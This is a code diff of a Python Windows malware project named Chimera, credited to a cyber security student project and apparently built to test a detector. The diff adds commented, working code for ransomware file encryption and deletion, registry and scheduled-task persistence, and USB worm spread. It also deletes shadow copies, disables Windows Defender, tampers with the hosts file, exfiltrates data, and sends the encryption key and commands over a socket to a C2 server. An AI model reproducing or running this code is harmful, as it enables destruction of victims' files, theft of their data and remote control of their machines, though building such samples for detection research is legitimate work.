@@ -18,56 +18,130 @@ Author: CADT Cyber Security Project
 Date: November 28, 2025
 """
 
-import os
-import time
-import socket
-import json
-import sys
-import shutil
-import subprocess
-import winreg
-import threading
-from cryptography.fernet import Fernet
+# Standard library imports for file operations, network, and system interaction
+import os          # File and directory operations
+import time        # Timing and delays
+import socket      # Network communication with C2 server
+import json        # JSON data serialization for C2 protocol
+import sys         # System-specific parameters and functions
+import shutil      # High-level file operations (copying for USB propagation)
+import subprocess  # Execute system commands (scheduled tasks, vssadmin, etc.)
+import winreg      # Windows registry manipulation for persistence
+import threading   # Multi-threaded execution of payloads
+from cryptography.fernet import Fernet  # AES-256 encryption for ransomware
 
-# === CONFIGURATION ===
-MALWARE_NAME = "WindowsUpdate.exe"
-C2_SERVER = "192.168.1.100"  # Change to your Kali Linux IP
-C2_PORT = 4444
-TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']
+# === CONFIGURATION PARAMETERS ===
+# These constants control the malware's behavior and can be customized
+MALWARE_NAME = "WindowsUpdate.exe"  # Disguised name to appear legitimate
+C2_SERVER = "192.168.101.73"  # Change to your Kali Linux IP address
+C2_PORT = 4444                # Command & Control server port
+TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']  # Files to encrypt
 
 class CompleteChimeraMalware:
+    """Main malware class - hybrid ransomware, wiper, and spyware"""
+    
     def __init__(self):
+        """Initialize malware with encryption keys and tracking variables"""
+        # Get the absolute path to this malware file
         self.current_path = os.path.abspath(sys.argv[0])
+        
+        # Get user's home directory for targeting documents
         self.user_home = os.path.expanduser("~")
-        # Generate the key once and keep it safe
-        self.encryption_key = Fernet.generate_key()
+        
+        # CRITICAL FIX: Use persistent encryption key
+        # If a key file exists from previous run, load it
+        # Otherwise generate new key and save it
+        # This ensures the SAME key is used across reboots/restarts
+        self.key_file = os.path.join(os.getcwd(), ".chimera_key_persist.dat")
+        self.encryption_key = self._get_or_create_persistent_key()
         self.cipher_suite = Fernet(self.encryption_key)
-        self.encrypted_count = 0
-        self.stolen_data_count = 0
+        
+        # Track statistics for attack report
+        self.encrypted_count = 0      # Number of files encrypted
+        self.stolen_data_count = 0    # Number of documents exfiltrated
+        
+        # Control flag for C2 communication loop
         self.keep_alive = True
+    
+    def _get_or_create_persistent_key(self):
+        """
+        Get persistent encryption key from file, or create new one
+        
+        This ensures the same key is used even if malware restarts.
+        Critical for:
+        1. Decrypting files after system reboot
+        2. Maintaining same key if malware is stopped/restarted
+        3. Allowing victim to decrypt files with consistent key
+        
+        Returns:
+            bytes: The persistent Fernet encryption key
+        """
+        try:
+            # Try to load existing key from hidden file
+            if os.path.exists(self.key_file):
+                with open(self.key_file, 'rb') as f:
+                    key = f.read()
+                print(f"[+] Loaded persistent encryption key from {self.key_file}")
+                return key
+        except:
+            pass
+        
+        # No existing key found - generate new one
+        key = Fernet.generate_key()
+        
+        # Save key to persistent file
+        try:
+            with open(self.key_file, 'wb') as f:
+                f.write(key)
+            # Hide the file on Windows
+            try:
+                subprocess.call(f'attrib +h "{self.key_file}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            print(f"[+] Generated and saved persistent encryption key")
+        except:
+            # If can't save, at least we have the key in memory
+            pass
+        
+        return key
         
     # ==========================================
     # PERSISTENCE MECHANISMS (FIXED)
     # ==========================================
     
     def establish_persistence(self):
-        """Establish multiple persistence mechanisms"""
+        """
+        Establish multiple persistence mechanisms to ensure malware survives reboots
+        Uses two techniques: Registry Run Key and Scheduled Tasks
+        """
         print("[+] Establishing Persistence...")
         
+        # TECHNIQUE 1: Registry Run Key Persistence
+        # This makes the malware execute every time the user logs in
         try:
-            # 1. Registry Run Key
+            # Open the registry key that controls startup programs
+            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                 0, winreg.KEY_SET_VALUE)
+            
+            # Add our malware with a legitimate-sounding name
             winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, self.current_path)
-            # FIX: Pass the 'key' object to CloseKey
+            
+            # Close the registry key properly
             winreg.CloseKey(key)
             print("    [+] Registry persistence established")
         except Exception as e:
             print(f"    [-] Registry failed: {e}")
 
+        # TECHNIQUE 2: Scheduled Task Persistence
+        # This makes the malware run every hour automatically
         try:
-            # 2. Scheduled Task
+            # Use Windows schtasks command to create a scheduled task
+            # /tn = task name (disguised as Microsoft service)
+            # /tr = task run (path to our malware)
+            # /sc hourly = schedule hourly execution
+            # /f = force creation (overwrite if exists)
             cmd = f'schtasks /create /tn "MicrosoftWindowsUpdate" /tr "{self.current_path}" /sc hourly /f'
             subprocess.call(cmd, shell=True)
             print("    [+] Scheduled task created")
@@ -79,12 +153,18 @@ class CompleteChimeraMalware:
     # ==========================================
     
     def propagate_usb_worm(self):
-        """Spread via USB drives"""
+        """
+        USB Worm Propagation - Spread to removable drives
+        Copies malware to USB drives and creates autorun.inf for automatic execution
+        """
         print("[+] Propagating via USB...")
         
+        # Check all possible drive letters (D: through Z:)
+        # C: is typically the system drive, so we skip it
         drives = ['%s:' % d for d in "DEFGHIJKLMNOPQRSTUVWXYZ"]
         infected_drives = 0
         
+        # Iterate through each potential drive letter
         for drive in drives:
             if os.path.exists(drive):
                 try:
@@ -118,20 +198,38 @@ class CompleteChimeraMalware:
     # ==========================================
     
     def encrypt_file(self, file_path):
-        """Encrypt a single file using AES-256"""
+        """
+        Encrypt a single file using AES-256 encryption
+        Args:
+            file_path: Full path to the file to encrypt
+        Returns:
+            True if encryption succeeded, False otherwise
+        """
         try:
+            # Read the original file content in binary mode
             with open(file_path, 'rb') as f:
                 original_data = f.read()
             
+            # Encrypt the data using AES-256 (Fernet)
             encrypted_data = self.cipher_suite.encrypt(original_data)
             
+            # Save the encrypted data with a new extension
             encrypted_path = file_path + ".chimera_encrypted"
             with open(encrypted_path, 'wb') as f:
                 f.write(encrypted_data)
+                # CRITICAL: Flush to disk immediately to trigger file system events
+                # This ensures aegis_real.py's watchdog can detect the modification
+                f.flush()
+                os.fsync(f.fileno())
             
+            # Small delay to ensure file system event is registered
+            time.sleep(0.01)
+            
+            # Delete the original unencrypted file
             os.remove(file_path)
             return True
         except Exception:
+            # Silently fail if file cannot be encrypted (permissions, in use, etc.)
             return False
 
     def payload_ransomware(self):
@@ -156,9 +254,18 @@ class CompleteChimeraMalware:
                                 self.encrypted_count += 1
                                 if self.encrypted_count % 10 == 0:
                                     print(f"    [+] Encrypted {self.encrypted_count} files...")
+                                # Small delay between encryptions (realistic ransomware behavior)
+                                # This also ensures aegis detection system can process events
+                                time.sleep(0.05)
         
         # Create ransom note
         self.create_ransom_note()
+        
+        # CRITICAL: Send encryption key to C2 server immediately
+        # This ensures the key is backed up even if local report is lost
+        if self.encrypted_count > 0:
+            self.send_encryption_key_to_c2()
+        
         print(f"[+] Ransomware: Encrypted {self.encrypted_count} files")
         return self.encrypted_count
 
@@ -209,12 +316,18 @@ class CompleteChimeraMalware:
     # ==========================================
     
     def payload_system_corruption(self):
-        """Corrupt system files and configurations"""
+        """
+        CORE MALICIOUS METHOD #2: System Corruption (Wiper)
+        Corrupt critical system files and disable security features
+        This makes the system unstable and prevents recovery
+        """
         print("[+] Starting System Corruption...")
         
+        # Counter for successful corruption actions
         corruption_actions = 0
         
-        # 1. Corrupt hosts file
+        # ACTION 1: Corrupt Windows hosts file to block security websites
+        # The hosts file maps domain names to IP addresses
         try:
             hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
             if os.path.exists(hosts_path):
@@ -233,40 +346,59 @@ class CompleteChimeraMalware:
                     "127.0.0.1 malwarebytes.com"
                 ]
                 
+                # REAL IMPLEMENTATION: Actually write to hosts file
                 with open(hosts_path, 'a') as f:
                     f.write('\n'.join(malicious_entries))
+                    f.flush()  # Ensure it's written to disk
+                    os.fsync(f.fileno())  # Force OS to write to disk
                 
                 corruption_actions += 1
                 print("    [+] Corrupted hosts file - blocked security sites")
+        except PermissionError:
+            print("    [-] Hosts file corruption failed: Need administrator privileges")
         except Exception as e:
             print(f"    [-] Hosts file corruption failed: {e}")
 
-        # 2. Delete shadow copies
+        # ACTION 2: Delete volume shadow copies (prevents file recovery)
+        # This requires administrator privileges to execute
         try:
-            result = subprocess.call("vssadmin delete shadows /all /quiet", shell=True)
+            result = subprocess.call("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             if result == 0:
                 corruption_actions += 1
-                print("    [+] Deleted volume shadow copies")
-        except:
-            pass
+                print("    [+] Deleted volume shadow copies (recovery disabled)")
+            else:
+                # Try alternative method using wmic
+                result2 = subprocess.call("wmic shadowcopy delete /nointeractive", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                if result2 == 0:
+                    corruption_actions += 1
+                    print("    [+] Deleted volume shadow copies via WMIC")
+        except Exception as e:
+            print(f"    [-] Shadow copy deletion failed: {e}")
 
-        # 3. Disable Windows Defender (simulated)
+        # ACTION 3: Disable Windows Defender real-time protection
+        # These PowerShell commands actually disable Windows Defender (requires admin)
         try:
             commands = [
                 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                 'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
-                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"'
+                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
+                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
+                'powershell -Command "Set-MpPreference -DisableScriptScanning $true"'
             ]
             
+            success_count = 0
             for cmd in commands:
-                subprocess.call(cmd, shell=True)
+                result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                if result == 0:
+                    success_count += 1
             
-            corruption_actions += 1
-            print("    [+] Disabled Windows Defender protections")
-        except:
-            pass
+            if success_count > 0:
+                corruption_actions += 1
+                print(f"    [+] Disabled {success_count}/5 Windows Defender protections")
+        except Exception as e:
+            print(f"    [-] Defender disabling failed: {e}")
 
-        # 4. Create corruption markers
+        # ACTION 4: Create corruption markers
         corruption_folders = [
             os.path.join(self.user_home, "AppData", "Local", "Temp"),
             os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
@@ -291,15 +423,20 @@ class CompleteChimeraMalware:
     # ==========================================
     
     def payload_data_exfiltration(self):
-        """Steal and exfiltrate sensitive data"""
+        """
+        CORE MALICIOUS METHOD #3: Data Exfiltration (Spyware)
+        Steal sensitive information from the victim's computer
+        Collects system info, document samples, network config, and browser data
+        """
         print("[+] Starting Data Exfiltration...")
         
+        # Collect all types of sensitive data into a structured dictionary
         stolen_data = {
-            "system_info": self.collect_system_info(),
-            "document_samples": self.steal_document_samples(),
-            "network_info": self.collect_network_info(),
-            "browser_data": self.find_browser_data(),
-            "timestamp": time.time()
+            "system_info": self.collect_system_info(),           # Computer name, user, OS version
+            "document_samples": self.steal_document_samples(),   # First 500 bytes from docs
+            "network_info": self.collect_network_info(),         # IP address, network config
+            "browser_data": self.find_browser_data(),            # Browser installation locations
+            "timestamp": time.time()                             # When the theft occurred
         }
         
         # Save locally
@@ -424,20 +561,133 @@ class CompleteChimeraMalware:
         except Exception as e:
             print(f"    [-] Failed to save stolen data: {e}")
 
+    def send_encryption_key_to_c2(self):
+        """
+        Send encryption key to C2 server for backup
+        
+        This is CRITICAL functionality:
+        - Ensures decryption key is never lost
+        - Stores key on attacker's C2 server
+        - Multiple retry attempts with exponential backoff
+        - Falls back to local storage if C2 unavailable
+        
+        Key is sent in JSON format:
+        {
+            "type": "encryption_key",
+            "key": "<base64_key_string>",
+            "bot_id": "<hostname_username>",
+            "encrypted_files": <count>,
+            "timestamp": <unix_timestamp>
+        }
+        """
+        print("[+] Sending encryption key to C2 server...")
+        
+        # Prepare key message
+        key_string = self.encryption_key.decode()  # Convert bytes to string
+        key_message = {
+            "type": "encryption_key",
+            "key": key_string,
+            "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
+            "computer_name": socket.gethostname(),
+            "username": os.getlogin(),
+            "encrypted_files": self.encrypted_count,
+            "timestamp": time.time()
+        }
+        
+        # Try multiple times with exponential backoff
+        max_retries = 5
+        retry_delays = [1, 2, 5, 10, 30]  # Seconds between retries
+        
+        for attempt in range(max_retries):
+            try:
+                # Create new socket for key exfiltration
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10.0)  # 10 second timeout
+                
+                # Connect to C2 server
+                s.connect((C2_SERVER, C2_PORT))
+                
+                # Send key message
+                s.send(json.dumps(key_message).encode())
+                
+                # Wait for acknowledgment
+                try:
+                    ack = s.recv(1024).decode()
+                    if ack:
+                        print(f"    [+] Encryption key sent to C2 server successfully")
+                        print(f"    [+] Key backed up on: {C2_SERVER}:{C2_PORT}")
+                        s.close()
+                        return True
+                except:
+                    pass  # No ACK needed, just send
+                
+                s.close()
+                print(f"    [+] Encryption key sent to C2 server (attempt {attempt + 1})")
+                return True
+                
+            except (socket.error, socket.timeout, ConnectionRefusedError) as e:
+                # Connection failed
+                if attempt < max_retries - 1:
+                    delay = retry_delays[attempt]
+                    print(f"    [-] C2 connection failed (attempt {attempt + 1}/{max_retries}), retrying in {delay}s...")
+                    time.sleep(delay)
+                else:
+                    print(f"    [-] Failed to send key to C2 after {max_retries} attempts")
+                    print(f"    [!] Key ONLY saved locally - ensure you backup the report file!")
+            except Exception as e:
+                print(f"    [-] Unexpected error sending key: {e}")
+                break
+        
+        # Fallback: Ensure key is saved locally
+        try:
+            fallback_file = os.path.join(os.getcwd(), "ENCRYPTION_KEY_BACKUP.txt")
+            with open(fallback_file, 'w') as f:
+                f.write(f"ENCRYPTION KEY BACKUP\n")
+                f.write(f"{'='*50}\n")
+                f.write(f"Bot: {socket.gethostname()}_{os.getlogin()}\n")
+                f.write(f"Encrypted Files: {self.encrypted_count}\n")
+                f.write(f"Timestamp: {time.ctime()}\n")
+                f.write(f"{'='*50}\n")
+                f.write(f"KEY: {key_string}\n")
+            print(f"    [+] Fallback: Key saved to {fallback_file}")
+        except:
+            pass
+        
+        return False
+
     # ==========================================
     # C2 COMMUNICATION WITH COMMAND HANDLING
     # ==========================================
     
     def handle_c2_communication(self):
-        """Enhanced C2 communication with command reception"""
+        """
+        Command & Control (C2) Communication Handler
+        Establishes connection to remote C2 server and waits for commands
+        Sends bot information and receives remote execution commands
+        Implements automatic retry on connection failure with exponential backoff
+        """
         print("[+] Starting C2 Communication Handler...")
         
+        retry_count = 0
+        max_retry_delay = 300  # Maximum 5 minutes between retries
+        
+        # Main C2 loop - keeps trying to connect until shutdown
         while self.keep_alive:
             try:
+                # Calculate retry delay with exponential backoff
+                if retry_count > 0:
+                    delay = min(30 * (2 ** (retry_count - 1)), max_retry_delay)
+                    print(f"    [*] Retry attempt {retry_count}, waiting {delay}s before reconnecting...")
+                    time.sleep(delay)
+                
                 # Create socket connection
+                print(f"    [*] Attempting to connect to C2: {C2_SERVER}:{C2_PORT}")
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(30.0)
                 s.connect((C2_SERVER, C2_PORT))
+                
+                # Reset retry counter on successful connection
+                retry_count = 0
                 
                 # Send handshake
                 handshake = {
@@ -447,7 +697,9 @@ class CompleteChimeraMalware:
                     "username": os.getlogin(),
                     "malware_version": "Chimera_Complete_v2.0",
                     "timestamp": time.time(),
-                    "status": "ACTIVE"
+                    "status": "ACTIVE",
+                    "encrypted_files": self.encrypted_count,
+                    "encryption_key": self.encryption_key.decode()  # Include key in handshake
                 }
                 
                 s.send(json.dumps(handshake).encode())
@@ -458,6 +710,7 @@ class CompleteChimeraMalware:
                     try:
                         data = s.recv(4096).decode()
                         if not data:
+                            print("    [!] C2 connection closed by server")
                             break
                             
                         command_data = json.loads(data)
@@ -469,15 +722,22 @@ class CompleteChimeraMalware:
                         # Execute command
                         result = self.execute_command(command, parameters)
                         
-                        # Send result back
+                        # Send result back with bot_id for better C2 tracking
                         response = {
                             "type": "command_result",
                             "command": command,
                             "result": result,
-                            "timestamp": time.time()
+                            "timestamp": time.time(),
+                            "bot_id": f"{socket.gethostname()}_{os.getlogin()}"
                         }
                         
-                        s.send(json.dumps(response).encode())
+                        try:
+                            s.send(json.dumps(response).encode())
+                            print(f"    [+] Executed: {command}")
+                            print(f"    [+] Result sent to C2")
+                        except (BrokenPipeError, ConnectionResetError):
+                            print("    [!] Failed to send response, connection lost")
+                            break
                         
                         # Send exfiltrated data if available
                         if command == "exfiltrate":
@@ -488,9 +748,16 @@ class CompleteChimeraMalware:
                                 "file_count": self.encrypted_count,
                                 "stolen_samples": self.stolen_data_count
                             }
-                            s.send(json.dumps(exfil_message).encode())
+                            try:
+                                s.send(json.dumps(exfil_message).encode())
+                            except (BrokenPipeError, ConnectionResetError):
+                                print("    [!] Failed to send exfiltration data")
+                                break
                             
                     except socket.timeout:
+                        continue
+                    except json.JSONDecodeError as e:
+                        print(f"    [-] Invalid JSON from C2: {e}")
                         continue
                     except Exception as e:
                         print(f"    [-] Command handling error: {e}")
@@ -498,52 +765,107 @@ class CompleteChimeraMalware:
                 
                 s.close()
                 
+            except (ConnectionRefusedError, socket.timeout) as e:
+                retry_count += 1
+                print(f"    [-] C2 connection failed: {e}")
             except Exception as e:
-                print(f"    [-] C2 Connection failed, retrying in 30 seconds: {e}")
-                time.sleep(30)
+                retry_count += 1
+                print(f"    [-] C2 error: {e}")
+                
+            # Limit retry attempts
+            if retry_count > 10:
+                print(f"    [!] Too many failed connection attempts, waiting 5 minutes...")
+                time.sleep(300)
+                retry_count = 0
 
     def execute_command(self, command, parameters):
-        """Execute commands received from C2 server"""
+        """
+        Execute commands received from C2 server
+        Supports multiple command types for remote control of the malware
+        
+        Args:
+            command: The command to execute (encrypt_files, exfiltrate, etc.)
+            parameters: Optional parameters for the command
+        Returns:
+            Dictionary with command result (will be sent back to C2 as JSON)
+        """
+        result = ""
         try:
+            # COMMAND: Trigger ransomware encryption
             if command == "encrypt_files":
-                result = self.payload_ransomware()
-                return f"Encrypted {result} files"
-                
+                count = self.payload_ransomware()
+                result = f"✓ Ransomware executed successfully\nFiles encrypted: {count}\nEncryption key sent to C2 server"
+            
+            # COMMAND: Trigger system corruption (wiper)
             elif command == "corrupt_system":
-                result = self.payload_system_corruption()
-                return f"Completed {result} corruption actions"
-                
+                count = self.payload_system_corruption()
+                result = f"✓ System corruption executed\nDestructive actions completed: {count}\nTargets: Hosts file, Shadow copies, Windows Defender"
+            
+            # COMMAND: Trigger data exfiltration (spyware)
             elif command == "exfiltrate":
-                result = self.payload_data_exfiltration()
-                return f"Exfiltrated {result} document samples"
-                
+                count = self.payload_data_exfiltration()
+                result = f"✓ Data exfiltration completed\nDocument samples stolen: {count}\nData includes: System info, documents, network config, browser data"
+            
+            # COMMAND: Get basic system information
             elif command == "system_info":
                 info = self.collect_system_info()
-                return f"System: {info['computer_name']} - User: {info['username']}"
-                
+                result = f"""✓ System Information Collected:
+
+Computer Name: {info.get('computer_name', 'N/A')}
+Username: {info.get('username', 'N/A')}
+User Home: {info.get('user_home', 'N/A')}
+Windows Version: {info.get('windows_version', 'N/A')}
+Processor Count: {info.get('processor_count', 'N/A')}
+Malware Path: {info.get('malware_path', 'N/A')}
+Current Time: {info.get('current_time', 'N/A')}"""
+            
+            # COMMAND: Check if bot is alive
             elif command == "status":
-                return "Bot active and operational"
-                
+                result = f"""✓ Bot Status Report:
+
+Bot ID: {socket.gethostname()}_{os.getlogin()}
+Status: ACTIVE
+Files Encrypted: {self.encrypted_count}
+Documents Exfiltrated: {self.stolen_data_count}
+C2 Connection: ACTIVE
+Persistence: Established
+Last Activity: {time.ctime()}"""
+            
+            # COMMAND: Trigger USB worm propagation
             elif command == "propagate":
-                result = self.propagate_usb_worm()
-                return f"Infected {result} USB drives"
-                
+                self.propagate_usb_worm()
+                result = "✓ USB propagation executed\nScanned drives: D-Z\nMalware copied to available USB drives\nAutorun files created"
+            
+            # COMMAND: Shutdown the malware gracefully
             elif command == "shutdown":
                 self.keep_alive = False
-                return "Shutting down malware"
+                result = "✓ Shutdown command received\nTerminating malware process\nClosing C2 connection"
+            
+            # COMMAND: Execute full attack sequence (all payloads at once)
+            # This is triggered by the C2 'autoexecute' command
             elif command == "auto_execute":
-                # Start full attack sequence (persistence, propagation, payloads)
                 try:
+                    # Run the full attack in a background thread to avoid blocking C2 communication
                     threading.Thread(target=self._auto_execute_all, daemon=True).start()
-                    return "Auto-execution started"
+                    result = f"""✓ Auto-Execute Started
+
+Initializing full attack sequence...
+Persistence: Establishing (Registry + Scheduled Task)
+Propagation: Deploying USB worm
+Payloads: Launching ransomware, wiper, spyware
+
+Attack running in background. Use 'status' to check progress."""
                 except Exception as e:
-                    return f"Failed to start auto-execution: {e}"
-                
+                    result = f"✖ Failed to start auto-execution\nError: {e}"
+            
+            # COMMAND: Unknown - return error
             else:
-                return f"Unknown command: {command}"
+                result = f"✖ Unknown command: {command}\nUse 'help' on C2 server to see available commands"
                 
         except Exception as e:
-            return f"Command execution failed: {e}"
+            result = f"✖ Command execution failed\nError: {str(e)}"
+        
+        return result
 
     def collect_exfiltration_data(self):
         """Collect data for exfiltration"""
@@ -699,46 +1021,106 @@ class CompleteChimeraMalware:
 # ==========================================
 
 class ChimeraDecryptor:
-    """Tool to decrypt files encrypted by Chimera malware (FIXED)"""
+    """
+    Decryption Tool for Chimera Ransomware
+    
+    This class provides functionality to decrypt files that were encrypted
+    by the Chimera malware. It requires the original encryption key that
+    was generated during the attack.
+    
+    Usage:
+        python chimera_real.py --decrypt <encryption_key>
+    
+    The key can be found in:
+        - chimera_attack_report.txt
+        - READ_ME_FOR_DECRYPT.txt
+    """
     
     def __init__(self, encryption_key):
-        # The key passed here must be the full Byte string
+        """
+        Initialize the decryptor with the encryption key
+        
+        Args:
+            encryption_key: The Fernet key (bytes) used for encryption
+        """
+        # Create a Fernet cipher suite using the provided key
+        # This same key was used to encrypt the files
         self.cipher_suite = Fernet(encryption_key)
     
     def decrypt_file(self, encrypted_path):
-        """Decrypt a single file (FIXED)"""
+        """
+        Decrypt a single file and restore original filename
+        
+        Args:
+            encrypted_path: Path to the .chimera_encrypted file
+        Returns:
+            True if decryption succeeded, False otherwise
+        """
         try:
-            # Remove .chimera_encrypted extension
+            # Remove the .chimera_encrypted extension to get original filename
             original_path = encrypted_path.replace('.chimera_encrypted', '')
             
+            # Read the encrypted file content
             with open(encrypted_path, 'rb') as f:
                 encrypted_data = f.read()
             
+            # Decrypt the data using the Fernet cipher
             decrypted_data = self.cipher_suite.decrypt(encrypted_data)
             
+            # Write the decrypted data back to the original filename
             with open(original_path, 'wb') as f:
                 f.write(decrypted_data)
             
+            # Delete the encrypted file (cleanup)
             os.remove(encrypted_path)
-            print(f"[+] Decrypted: {original_path}")
             return True
             
         except Exception as e:
-            print(f"[-] Failed to decrypt {encrypted_path}: {e}")
+            # Only print first error with details, suppress repeated errors
+            if not hasattr(self, '_error_shown'):
+                print(f"\n[!] DECRYPTION ERROR: {str(e)}")
+                print(f"[!] This usually means the key is incorrect or in wrong format")
+                print(f"[!] File: {os.path.basename(encrypted_path)}\n")
+                self._error_shown = True
             return False
     
     def decrypt_all_files(self, start_folder):
-        """Decrypt all encrypted files in a folder (FIXED)"""
+        """Decrypt all encrypted files in a folder and subdirectories"""
         decrypted_count = 0
+        failed_count = 0
+        total_encrypted = 0
         
+        # First, count total encrypted files
+        print(f"[*] Scanning for encrypted files in: {start_folder}")
+        for root, dirs, files in os.walk(start_folder):
+            for file in files:
+                if file.endswith('.chimera_encrypted'):
+                    total_encrypted += 1
+        
+        print(f"[*] Found {total_encrypted} encrypted files")
+        print(f"[*] Starting decryption...\n")
+        
+        # Decrypt each file with progress reporting
         for root, dirs, files in os.walk(start_folder):
             for file in files:
                 if file.endswith('.chimera_encrypted'):
                     file_path = os.path.join(root, file)
                     if self.decrypt_file(file_path):
                         decrypted_count += 1
+                        # Show progress every 10 files
+                        if decrypted_count % 10 == 0:
+                            print(f"    Progress: {decrypted_count}/{total_encrypted} files decrypted...")
+                    else:
+                        failed_count += 1
         
-        print(f"[+] Successfully decrypted {decrypted_count} files")
+        # Final report
+        print(f"\n{'='*50}")
+        print(f"DECRYPTION COMPLETE")
+        print(f"{'='*50}")
+        print(f"✓ Successfully decrypted: {decrypted_count} files")
+        if failed_count > 0:
+            print(f"✗ Failed to decrypt: {failed_count} files")
+        print(f"Total processed: {total_encrypted} files")
         return decrypted_count
 
 # ==========================================
@@ -749,17 +1131,53 @@ if __name__ == "__main__":
     # Check if we're in decryption mode
     if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
         if len(sys.argv) > 2:
-            # FIX: We take the string from command line and encode it to bytes
-            # The user must provide the FULL key string from the report/note
+            # Get the key from command line
             key_str = sys.argv[2]
             print(f"[*] Attempting decryption with key: {key_str}")
             
             try:
-                key_bytes = key_str.encode()
+                # CRITICAL FIX: Handle both URL-safe and standard base64 formats
+                # Convert URL-safe base64 to standard base64
+                # Replace - with + and _ with /
+                import base64
+                
+                # Try URL-safe base64 first (common in modern systems)
+                try:
+                    # Add padding if needed
+                    key_str_padded = key_str
+                    padding_needed = len(key_str) % 4
+                    if padding_needed:
+                        key_str_padded += '=' * (4 - padding_needed)
+                    
+                    # Decode URL-safe base64
+                    key_bytes = base64.urlsafe_b64decode(key_str_padded)
+                    print(f"[*] Decoded URL-safe base64 key ({len(key_bytes)} bytes)")
+                except:
+                    # Fallback to standard base64
+                    try:
+                        key_bytes = base64.b64decode(key_str)
+                        print(f"[*] Decoded standard base64 key ({len(key_bytes)} bytes)")
+                    except:
+                        # Last resort: use as-is (encoded string)
+                        key_bytes = key_str.encode()
+                        print(f"[*] Using key as UTF-8 encoded string")
+                
+                # Fernet expects the key to be exactly 32 bytes when base64 decoded
+                if len(key_bytes) != 32:
+                    print(f"[!] WARNING: Key is {len(key_bytes)} bytes, expected 32 bytes")
+                    print(f"[!] This key may not work. Check if you copied the complete key.")
+                
                 decryptor = ChimeraDecryptor(key_bytes)
                 decryptor.decrypt_all_files(os.path.expanduser("~"))
+                
             except Exception as e:
-                print(f"[!] Error initializing decryptor. Key might be wrong format.\nError: {e}")
+                print(f"\n[!] FATAL ERROR: Could not initialize decryptor")
+                print(f"[!] Error: {e}")
+                print(f"\n[?] TROUBLESHOOTING:")
+                print(f"    1. Make sure you copied the COMPLETE key from the ransom note")
+                print(f"    2. Key should be ~44 characters long (base64 format)")
+                print(f"    3. Check chimera_attack_report.txt or READ_ME_FOR_DECRYPT.txt")
+                print(f"    4. On C2 server, use 'keys' command to view all encryption keys")
         else:
             print("Usage: python chimera_real.py --decrypt <FULL_KEY_FROM_NOTE>")
             print("Encryption key can be found in chimera_attack_report.txt or ransom note")
